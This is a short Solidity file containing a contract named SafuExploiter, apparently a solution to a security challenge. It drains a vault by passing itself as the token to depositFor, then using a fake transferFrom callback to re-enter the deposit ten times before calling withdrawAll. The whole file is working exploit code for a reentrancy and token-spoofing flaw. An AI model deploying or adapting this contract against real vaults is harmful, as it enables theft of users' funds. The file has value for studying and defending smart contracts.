// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IVault {
    function depositFor(
        address token, 
        uint256 _amount, 
        address user
    ) external;
    function withdrawAll() external;
}

/// @dev exploiter contract
contract SafuExploiter {

    uint256 numLoops;
    IVault vault;
    IERC20 usdc;

    /// @dev starts the exploit
    function runExploit(
        address usdcAddress, 
        address vaultAddress
    ) external {
        usdc = IERC20(usdcAddress);
        vault = IVault(vaultAddress);

        uint256 usdcBalance = usdc.balanceOf(address(this));
        uint256 amountPerLoop = usdcBalance/10;

        vault.depositFor(address(this),amountPerLoop,address(this));

        vault.withdrawAll(); // send funds back to user
        usdc.transfer(msg.sender,usdc.balanceOf(address(this)));
    }

    /// @dev callback function from depositFor (safeTransferFrom)
    function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) external {
        require(msg.sender == address(vault), "invalid caller");

        if (numLoops < 10) {
            numLoops ++;
            usdc.transfer(msg.sender, amount); // send funds from this contract
            vault.depositFor(address(this), amount, address(this));
        }
    }

}